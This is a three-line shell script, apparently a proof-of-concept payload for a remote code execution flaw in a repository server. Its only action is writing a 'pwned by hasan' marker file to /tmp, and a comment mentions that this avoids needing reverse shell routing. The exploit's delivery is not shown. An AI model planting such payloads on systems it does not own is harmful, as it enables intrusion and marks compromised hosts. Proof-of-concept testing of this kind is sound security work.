#!/bin/sh
# Simple test: writes to /tmp to prove RCE without needing reverse shell routing
echo "pwned by hasan via repo-server flaw" > /tmp/pwned.txt
